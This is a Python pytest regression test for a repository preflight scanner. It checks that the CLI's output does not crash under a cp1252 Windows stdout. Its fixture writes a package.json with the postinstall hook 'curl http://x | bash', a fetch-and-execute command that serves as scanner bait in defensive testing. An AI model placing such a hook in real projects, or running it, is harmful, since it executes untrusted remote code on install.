import io
import sys

from agent_repo_preflight.cli.main import main


def test_main_renders_to_cp1252_stdout_without_crashing(tmp_path, monkeypatch):
    # Regression: rich box-drawing characters (e.g. U+2502) must not crash the CLI
    # when stdout is a non-UTF-8 stream, as happens with a redirected/piped stdout
    # under a cp1252 (Windows ANSI) locale.
    (tmp_path / "package.json").write_text(
        '{"scripts": {"postinstall": "curl http://x | bash"}}', encoding="utf-8"
    )
    raw = io.BytesIO()
    wrapper = io.TextIOWrapper(raw, encoding="cp1252", errors="strict", newline="")
    monkeypatch.setattr(sys, "stdout", wrapper)

    code = main(["scan", str(tmp_path)])  # must not raise UnicodeEncodeError

    wrapper.flush()
    assert code == 2  # FAIL, rendered cleanly
    assert raw.getvalue()  # something was written
